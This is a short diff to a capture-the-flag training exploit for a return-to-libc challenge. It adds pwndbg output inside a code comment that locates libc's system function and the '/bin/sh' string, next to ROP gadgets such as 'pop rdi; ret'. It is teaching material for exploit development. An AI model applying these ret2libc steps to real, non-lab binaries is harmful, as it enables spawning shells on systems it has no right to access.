@@ -89,6 +89,15 @@ dylan@linuxOS:~/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc
 0x000000000040116a: mov rdi, rax; mov eax, 0; call 0x1040; nop; leave; ret; 
 0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
 0x000000000040120b: pop rdi; ret; 
+	
+	
+pwndbg> x 0x7ffff7c4e520
+0x7ffff7c4e520 <__libc_system>: 0xfa1e0ff3
+pwndbg> x 0x7ffff7c4e520 - 0x4e520 + 0x1b61b4
+0x7ffff7db61b4: 0x6e69622f
+pwndbg> x/s 0x7ffff7c4e520 - 0x4e520 + 0x1b61b4
+0x7ffff7db61b4: "/bin/sh"
+	
   */
   
   from pwn import *
